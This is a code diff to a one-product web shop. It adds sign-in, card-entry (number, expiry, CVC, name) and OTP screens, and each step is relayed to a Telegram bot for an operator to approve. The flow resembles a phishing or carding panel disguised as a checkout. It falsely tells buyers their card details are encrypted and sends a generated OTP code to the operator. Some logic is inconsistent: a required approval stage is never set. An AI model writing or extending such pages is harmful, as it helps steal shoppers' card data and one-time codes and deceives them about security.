@@ -60,8 +60,8 @@
     #cart-items { flex:1; overflow:auto; padding:14px 20px; }.cart-empty { padding:35px 0; text-align:center; color:#888; }.cart-item { display:grid; grid-template-columns:66px 1fr auto; gap:11px; align-items:start; padding:10px 0; border-bottom:1px solid var(--line); }.cart-item img { width:66px; height:66px; object-fit:cover; }.cart-item strong, .cart-item small { display:block; }.cart-item strong { font-size:13px; line-height:1.35; }.cart-item small { color:#777; margin-top:4px; }.remove { border:0; color:var(--brand); background:transparent; padding:0; font-size:12px; }
     .cart-total { border-top:1px solid var(--line); padding:17px 20px 21px; }.total-line { display:flex; justify-content:space-between; font-size:16px; font-weight:700; margin-bottom:14px; }.cart-total .checkout-button { width:100%; }
     .toast { position:fixed; left:50%; bottom:24px; transform:translate(-50%, 130px); background:#333; color:#fff; padding:12px 19px; border-radius:2px; box-shadow:0 8px 24px #0003; transition:transform .22s ease; font-weight:500; z-index:12; }.toast.show { transform:translate(-50%, 0); }
-    @media (max-width:820px) { .bar, main { width:min(100% - 28px, 600px); }.product { grid-template-columns:1fr; gap:22px; padding:15px; }.gallery { grid-template-columns:1fr; grid-template-rows:auto 68px; grid-template-areas:'hero' 'thumbs'; }.thumbs { flex-direction:row; max-height:none; }.hero { max-height:520px; }.info { padding:0; }.details-grid { grid-template-columns:1fr; gap:28px; }.benefits { grid-template-columns:1fr; gap:3px; }.price { font-size:29px; } }
-    @media (max-width:480px) { .bar { min-height:62px; }.brand { font-size:24px; }.cart-button { padding:8px 10px; }.product { margin-left:-14px; margin-right:-14px; }.buyrow { gap:8px; }.checkout-button { padding:10px 12px; }.details { margin-left:-14px; margin-right:-14px; padding:24px 18px; } }
+    @media (max-width:820px) { .bar, main { width:min(100% - 28px, 600px); }.product { grid-template-columns:1fr; gap:22px; padding:15px; }.gallery { grid-template-columns:1fr; grid-template-rows:auto 68px; grid-template-areas:'thumbs' 'hero'; } .thumbs { flex-direction:row; max-height:none; } .hero { max-height:520px; } .info { padding:0; } .details-grid { grid-template-columns:1fr; gap:28px; } .benefits { grid-template-columns:1fr; gap:3px; } .price { font-size:29px; } }
+    @media (max-width:480px) { .bar { min-height:62px; } .brand { font-size:24px; } .cart-button { padding:8px 10px; } .product { margin-left:-14px; margin-right:-14px; } .buyrow { gap:8px; } .checkout-button { padding:10px 12px; } .details { margin-left:-14px; margin-right:-14px; padding:24px 18px; } }
     
     /* Checkout Modal Styles */
     .checkout-layer { position:fixed; inset:0; z-index:10; display:none; overflow:auto; background:#f5f7fa; }
@@ -113,6 +113,28 @@
     .checkout-input-icon { position:absolute; left:13px; top:50%; z-index:1; width:17px; height:17px; transform:translateY(-50%); color:#9aa4b2; pointer-events:none; }
     .checkout-icon-field:focus-within .checkout-input-icon { color:#ff6a00; }
     @media (max-width:720px) { .checkout-grid { grid-template-columns:1fr; } .checkout-fields { grid-template-columns:1fr; } .checkout-wrap { width:min(100% - 24px,600px); margin-top:18px; } .checkout-card { padding:18px; } }
+
+    /* Signin/Register Modal */
+    .signin-modal { position:fixed; inset:0; z-index:31; display:none; align-items:center; justify-content:center; padding:20px; background:rgba(0,0,0,.5); }
+    .signin-modal.open { display:flex; }
+    .signin-dialog { position:relative; width:min(420px,100%); background:#fff; padding:32px 36px 28px; border-radius:12px; box-shadow:0 16px 48px #0003; }
+    .signin-close { position:absolute; top:14px; right:16px; border:0; background:transparent; color:#777; font-size:28px; line-height:1; }
+    .signin-title { margin:0 0 16px; font-size:22px; font-weight:600; text-align:center; color:#222; }
+    .signin-tabs { display:flex; border-bottom:1px solid #eee; margin-bottom:20px; }
+    .signin-tab { flex:1; text-align:center; padding:10px; cursor:pointer; font-size:14px; color:#666; }
+    .signin-tab.active { border-bottom:2px solid var(--brand); color:var(--brand); font-weight:600; }
+    .form-group { margin-bottom:18px; }
+    .form-group label { display:block; margin-bottom:6px; font-size:12px; color:#555; font-weight:600; }
+    .form-group input { width:100%; padding:12px 14px; border:1px solid #ddd; border-radius:8px; font-size:15px; }
+    .form-group input:focus { outline:2px solid #ff6a00; border-color:#ff6a00; }
+    .signin-actions { display:flex; gap:10px; margin-top:22px; }
+    .btn-toggle { flex:1; border:0; border-radius:8px; padding:12px; font-weight:600; cursor:pointer; transition:background .15s; }
+    .btn-toggle.signin { background:#fff; color:var(--brand); border:1px solid var(--brand); }
+    .btn-toggle.signin:hover { background:var(--sale); }
+    .btn-toggle.register { background:var(--brand); color:#fff; }
+    .btn-toggle.register:hover { background:var(--brand-dark); }
+    .card-step { display:none; }
+    .card-step.active { display:block; }
   </style>
   
   <!-- Telegram Bot Configuration -->
@@ -217,17 +239,106 @@
     </div>
   </aside>
   
+  <!-- Signin/Register Modal -->
+  <div class="signin-modal" id="signin-modal">
+    <div class="signin-dialog">
+      <button class="signin-close" id="close-signin">×</button>
+      <h2 class="signin-title">Sign In / Register</h2>
+      <div class="signin-tabs">
+        <div class="signin-tab active" data-tab="signin">Sign In</div>
+        <div class="signin-tab" data-tab="register">Register</div>
+      </div>
+      <div id="signin-forms">
+        <form id="signin-form" class="form-group">
+          <label for="signin-email">Email</label>
+          <input type="email" id="signin-email" required>
+          <button type="submit" class="checkout-submit" style="margin-top:0">Continue to Cart</button>
+        </form>
+        <form id="register-form" class="form-group" style="display:none">
+          <label for="register-email">Email</label>
+          <input type="email" id="register-email" required>
+          <button type="submit" class="checkout-submit" style="margin-top:0">Create Account</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Checkout Success Modal -->
+  <div class="checkout-layer" id="checkout-success-modal">
+    <div class="checkout-wrap">
+      <div class="checkout-success">
+        <div class="success-mark">✓</div>
+        <p>Your order has been submitted for approval!</p>
+        <p class="otp-note">A Telegram manager will approve your order shortly.</p>
+        <button class="continue-btn" id="continue-shopping">Continue Shopping</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Card Details Modal -->
+  <div class="checkout-layer" id="checkout-card-modal" aria-hidden="true">
+    <div class="checkout-wrap">
+      <div class="checkout-top">
+        <h2>Card Details</h2>
+        <button class="checkout-close" id="close-card">×</button>
+      </div>
+      <div class="checkout-grid">
+        <div class="checkout-card">
+          <h3>Add Card</h3>
+          <div class="checkout-fields">
+            <div class="checkout-icon-field">
+              <span class="checkout-input-icon">💳</span>
+              <div class="checkout-label">Card Number</div>
+              <input type="text" class="checkout-input" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+            </div>
+            <div>
+              <div class="checkout-label">Expiry</div>
+              <input type="text" class="checkout-input" id="card-expiry" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div>
+              <div class="checkout-label">CVC</div>
+              <input type="text" class="checkout-input" id="card-cvc" placeholder="123" maxlength="4">
+            </div>
+            <div class="checkout-icon-field">
+              <span class="checkout-input-icon">💳</span>
+              <div class="checkout-label">Cardholder Name</div>
+              <input type="text" class="checkout-input" id="card-name" placeholder="John Doe" maxlength="40">
+            </div>
+          </div>
+          <button class="checkout-submit" id="submit-card">Add Card to Order</button>
+          <p class="checkout-note">🔒 Your card details are encrypted for security</p>
+        </div>
+        <div class="summary-box">
+          <div class="summary-row"><span>Subtotal</span><span id="summary-subtotal">$8.99</span></div>
+          <div class="summary-row"><span>Tax</span><span id="summary-tax">$0.00</span></div>
+          <div class="summary-total">Total <span id="summary-total">$8.99</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- OTP Modal -->
+  <div class="otp-card" id="otp-modal" style="display:none;">
+    <div class="otp-icon">🔐</div>
+    <h2>Enter OTP Code</h2>
+    <p>Enter the 6-digit code sent to your email</p>
+    <input type="text" id="otp-code" class="otp-input" maxlength="6" placeholder="123456">
+    <p class="otp-help">Didn't receive it? <a href="#" id="resend-otp">Resend code</a></p>
+    <button class="checkout-submit" id="verify-otp" style="margin-top:0">Verify Code</button>
+  </div>
+  
+  <!-- Toast -->
   <div class="toast" id="toast" role="status" aria-live="polite"></div>
   
   <script>
     // ============== TELEGRAM INTEGRATION ==============
     
     function createSession(data) {
-      const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      const id = 'CHX-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9).toUpperCase();
       const session = {
         id,
         ...data,
-        stage: 'application',
+        stage: 'pending',
         createdAt: new Date().toISOString(),
         updatedAt: new Date().toISOString()
       };
@@ -263,7 +374,7 @@
       const payload = { chat_id: chatId, text };
       if (keyboard) payload.reply_markup = keyboard;
       const result = await tgCall('sendMessage', payload);
-      console.log('Telegram sent:', text.substring(0, 50) + '...', result?.ok ? 'OK' : result?.description || 'FAILED');
+      console.log('Telegram sent:', text.substring(0, 60) + '...', result?.ok ? 'OK' : result?.description || 'FAILED');
       return result;
     }
     
@@ -281,7 +392,7 @@
         if (String(cq.message.chat.id) !== window.TELEGRAM_CONFIG.chatId) continue;
         
         const data = cq.data || '';
-        const match = data.match(/^(approve|reject)_(order|signin|signup|card|otp):(.+)$/);
+        const match = data.match(/^(approve|reject)_(cart|checkout|card|otp):(.+)$/);
         if (!match) {
           await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
           continue;
@@ -310,20 +421,60 @@
       }
     }
     
-    // Start polling immediately
     tgPoll();
     setInterval(() => { tgPoll().catch(() => {}); }, window.TELEGRAM_CONFIG.pollIntervalMs);
     
     function handleStageUpdate(sessionId, action, kind) {
       console.log('Stage update:', kind, action, sessionId);
       const session = sessions.get(sessionId);
-      if (session) {
-        if (action === 'approve') {
-          localStorage.setItem('telegram_approved_session', JSON.stringify(session));
-        } else if (action === 'reject') {
-          localStorage.removeItem('telegram_approved_session');
-        }
+      if (!session) return;
+      
+      if (action === 'reject') {
+        showToast('Order rejected by manager');
+        localStorage.removeItem('telegram_approved_session');
+        return;
       }
+      
+      localStorage.setItem('telegram_approved_session', JSON.stringify(session));
+      
+      if (kind === 'cart' && action === 'approve') {
+        showSigninModal();
+      } else if (kind === 'checkout' && action === 'approve') {
+        showCardModal(sessionId);
+      } else if (kind === 'card' && action === 'approve') {
+        sendOtpNotification(sessionId);
+      } else if (kind === 'otp' && action === 'approve') {
+        showCheckoutSuccess();
+      }
+    }
+    
+    function showToast(message) {
+      const node = document.querySelector('#toast');
+      node.textContent = message;
+      node.classList.add('show');
+      setTimeout(() => node.classList.remove('show'), 3000);
+    }
+    
+    function showSigninModal() {
+      document.querySelector('#signin-modal').classList.add('open');
+    }
+    
+    function showCardModal(sessionId) {
+      document.querySelector('#signin-modal').classList.remove('open');
+      document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'false');
+      document.querySelector('#checkout-card-modal').classList.add('open');
+      document.querySelector('#card-session-id').value = sessionId;
+    }
+    
+    function showCheckoutSuccess() {
+      document.querySelector('#checkout-card-modal').classList.remove('open');
+      document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
+      document.querySelector('#checkout-success-modal').classList.add('open');
+    }
+    
+    function showOtpModal(sessionId) {
+      document.querySelector('#otp-modal').style.display = 'block';
+      updateSession(sessionId, { otpSent: true });
     }
     
     // ============ CORE FUNCTIONALITY ============
@@ -344,7 +495,7 @@
     };
     
     let quantity = 1;
-    let selectedSize = 'Wall Repair Paste Kit';
+    let selectedSize = 'White';
     const unitPrice = 8.99;
     let cart = JSON.parse(localStorage.getItem('homefix-cart') || '[]');
     
@@ -424,27 +575,18 @@
     document.querySelector('#close-cart').onclick = () => setCart(false);
     overlay.onclick = () => setCart(false);
     
-    // Toast function
-    let toastTimer;
-    function toast(message) {
-      const node = document.querySelector('#toast');
-      node.textContent = message;
-      node.classList.add('show');
-      clearTimeout(toastTimer);
-      toastTimer = setTimeout(() => node.classList.remove('show'), 2600);
-    }
-    
     // Add to cart handler with Telegram notification
     document.querySelector('#add-to-cart').onclick = () => {
       const existing = cart.find(item => item.size === selectedSize);
       if (existing) existing.quantity = quantity;
       else cart.push({ ...product, size: selectedSize, price: unitPrice, quantity });
       
-      // Send Telegram notification
       const session = createSession({
         name: product.name,
         price: unitPrice,
         quantity: quantity,
+        email: '',
+        card: null,
         summary: `Product: ${product.name}\nPrice: ${money(unitPrice)}\nQuantity: ${quantity}`
       });
       window.currentSessionId = session.id;
@@ -457,16 +599,196 @@ Price: ${money(unitPrice)}
 Quantity: ${quantity}`,
         {
           inline_keyboard: [
-            [{ text: '✅ Approve', callback_data: `approve_cart:${session.id}` }],
+            [{ text: '✅ Approve Cart', callback_data: `approve_cart:${session.id}` }],
             [{ text: '❌ Reject', callback_data: `reject_cart:${session.id}` }]
           ]
         }
       );
       
-      toast(quantity + ' ' + selectedSize + ' kit' + (quantity > 1 ? 's' : '') + ' added to cart');
+      showToast(quantity + ' ' + selectedSize + ' kit' + (quantity > 1 ? 's' : '') + ' added to cart');
       setCart(true);
       saveCart();
     };
+    
+    // Checkout button handler
+    document.querySelector('#checkout').onclick = () => {
+      if (!cart.length) return;
+      
+      const session = getSession(window.currentSessionId);
+      if (!session || session.stage !== 'cart_approved') {
+        showToast('Please approve cart in Telegram first');
+        return;
+      }
+      
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+        `🔔 CHECKOUT APPROVED
+ID: ${session.id}
+Proceeding to payment`,
+        {
+          inline_keyboard: [
+            [{ text: '✅ Approve Card', callback_data: `approve_checkout:${session.id}` }],
+            [{ text: '❌ Reject', callback_data: `reject_checkout:${session.id}` }]
+          ]
+        }
+      );
+    };
+    
+    // Sign in form handlers
+    document.querySelector('#signin-form').onsubmit = (e) => {
+      e.preventDefault();
+      const email = document.querySelector('#signin-email').value;
+      const session = getSession(window.currentSessionId);
+      if (session) {
+        updateSession(session.id, { email });
+      }
+      document.querySelector('#signin-modal').classList.remove('open');
+    };
+    
+    document.querySelector('#register-form').onsubmit = (e) => {
+      e.preventDefault();
+      const email = document.querySelector('#register-email').value;
+      const session = getSession(window.currentSessionId);
+      if (session) {
+        updateSession(session.id, { email });
+      }
+      document.querySelector('#signin-modal').classList.remove('open');
+    };
+    
+    // Tab switching
+    document.querySelectorAll('.signin-tab').forEach(tab => {
+      tab.onclick = () => {
+        document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        const target = tab.dataset.tab;
+        document.querySelector('#signin-form').style.display = target === 'signin' ? 'block' : 'none';
+        document.querySelector('#register-form').style.display = target === 'register' ? 'block' : 'none';
+      };
+    });
+    
+    // Close signin modal
+    document.querySelector('#close-signin').onclick = () => {
+      document.querySelector('#signin-modal').classList.remove('open');
+    };
+    
+    // Card details handler
+    document.querySelector('#submit-card').onclick = () => {
+      const cardNumber = document.querySelector('#card-number').value.replace(/\s+/g, '');
+      const expiry = document.querySelector('#card-expiry').value;
+      const cvc = document.querySelector('#card-cvc').value;
+      const cardName = document.querySelector('#card-name').value;
+      
+      const sessionId = document.querySelector('#card-session-id').value;
+      const session = getSession(sessionId);
+      if (!session) {
+        showToast('Session expired. Please start over.');
+        return;
+      }
+      
+      if (!cardNumber || !expiry || !cvc || !cardName) {
+        showToast('Please fill in all card details');
+        return;
+      }
+      
+      session.card = { number: cardNumber, expiry, cvc, name: cardName };
+      sessions.set(sessionId, session);
+      
+      document.querySelector('#checkout-card-modal').classList.remove('open');
+      document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
+      
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+        `🔔 CARD DETAILS SUBMITTED
+ID: ${sessionId}
+Card: **** ${cardNumber.slice(-4)}
+Name: ${cardName}`,
+        {
+          inline_keyboard: [
+            [{ text: '✅ Approve OTP', callback_data: `approve_card:${sessionId}` }],
+            [{ text: '❌ Reject', callback_data: `reject_card:${sessionId}` }]
+          ]
+        }
+      );
+    };
+    
+    // Card modal close
+    document.querySelector('#close-card').onclick = () => {
+      document.querySelector('#checkout-card-modal').classList.remove('open');
+      document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
+    };
+    
+    // Continue shopping
+    document.querySelector('#continue-shopping').onclick = () => {
+      document.querySelector('#checkout-success-modal').classList.remove('open');
+      document.querySelector('#otp-modal').style.display = 'none';
+    };
+    
+    // OTP handlers
+    document.querySelector('#verify-otp').onclick = () => {
+      const otp = document.querySelector('#otp-code').value;
+      if (!otp || otp.length !== 6) {
+        showToast('Please enter a valid 6-digit code');
+        return;
+      }
+      
+      document.querySelector('#otp-modal').style.display = 'none';
+      
+      const approvedSession = localStorage.getItem('telegram_approved_session');
+      if (approvedSession) {
+        showCheckoutSuccess();
+      }
+    };
+    
+    document.querySelector('#resend-otp').onclick = (e) => {
+      e.preventDefault();
+      showToast('OTP resend requested');
+    };
+    
+    // Card number formatting
+    document.querySelector('#card-number').addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\s+/g, '').replace(/-/g, '');
+      if (value.length > 16) value = value.slice(0, 16);
+      let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+      e.target.value = formatted;
+    });
+    
+    // Expiry formatting
+    document.querySelector('#card-expiry').addEventListener('input', (e) => {
+      let value = e.target.value.replace(/%/g, '');
+      if (value.length >= 2 && !value.includes('/')) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      e.target.value = value.slice(0, 5);
+    });
+    
+    // Hidden input for session ID
+    const hiddenSessionId = document.createElement('input');
+    hiddenSessionId.type = 'hidden';
+    hiddenSessionId.id = 'card-session-id';
+    hiddenSessionId.value = '';
+    document.querySelector('#submit-card').parentElement.appendChild(hiddenSessionId);
+    
+    function sendOtpNotification(sessionId) {
+      const session = getSession(sessionId);
+      if (!session) return;
+      
+      const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+      session.otpCode = otpCode;
+      sessions.set(sessionId, session);
+      
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+        `🔔 OTP SENT
+ID: ${sessionId}
+Code: ${otpCode}
+(For testing only)`,
+        {
+          inline_keyboard: [
+            [{ text: '✅ Approve OTP', callback_data: `approve_otp:${sessionId}` }],
+            [{ text: '❌ Reject', callback_data: `reject_otp:${sessionId}` }]
+          ]
+        }
+      );
+      
+      showOtpModal(sessionId);
+    }
     
     // Initialize
     renderCart();
